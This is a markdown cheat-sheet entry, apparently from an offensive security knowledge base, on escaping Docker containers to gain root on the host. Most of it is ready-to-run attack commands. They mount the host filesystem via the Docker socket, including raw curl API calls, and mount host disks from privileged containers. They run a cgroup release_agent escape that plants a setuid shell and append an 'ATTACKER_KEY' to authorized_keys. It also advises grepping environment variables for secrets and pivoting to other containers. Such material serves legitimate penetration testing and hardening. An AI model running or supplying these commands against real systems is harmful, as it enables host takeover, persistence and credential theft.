---
id: linux-docker-escape
title: Docker Escape
stage: privesc
tags: [linux]
tools:
  - find / -name docker.sock 2>/dev/null
  - docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  - capsh --print
leads_to: [root-linux]
summary: Escape Docker containers via socket access, privileged mode, or exposed capabilities to gain root on the host.
---

## Check if Inside a Container

```bash
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv          # file exists inside containers
hostname                # often a short hash
```

## Docker Socket Escape (Most Common)

If `/var/run/docker.sock` is accessible from inside the container:

```bash
# Check for socket
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Use socket to mount host filesystem
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
# Now you have a root shell with access to the ENTIRE host filesystem
```

If `docker` binary isn't in the container, use raw API calls:

```bash
# Pull and run via curl to the socket
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Mounts":[{"Type":"bind","Source":"/","Target":"/mnt"}],"HostConfig":{"Binds":["/:/mnt"]}}' \
  http://localhost/containers/create
```

## Privileged Container Escape

```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff  = all capabilities = privileged

capsh --decode=0000003fffffffff   # verify

# Mount host disk and chroot
fdisk -l                          # find host disk
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash
```

## Capability Abuse — CAP_SYS_ADMIN

```bash
capsh --print | grep sys_admin

# If cap_sys_admin is set, mount procfs and escape via cgroup notify_on_release
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" >> /exploit
chmod +x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
/tmp/bash -p
```

## Writable Host Path Mounts

```bash
# Check mounted volumes
mount | grep -v "proc\|sys\|dev\|cgroup"
cat /proc/mounts

# If /etc or other sensitive paths are mounted — write authorized_keys
echo "ssh-rsa ATTACKER_KEY" >> /mnt/host_home/.ssh/authorized_keys
# or drop suid binary on host path
cp /bin/bash /mnt/hostpath/bash && chmod +s /mnt/hostpath/bash
```

## Notes

- The docker socket (`/var/run/docker.sock`) gives full daemon control — if accessible, you own the host
- Privileged containers have all capabilities + device access — immediate escape
- Check environment variables for API keys and service credentials too (`env | grep -i token\|secret\|key\|pass`)
- After escape, you're root on the container host — check for other containers to pivot to

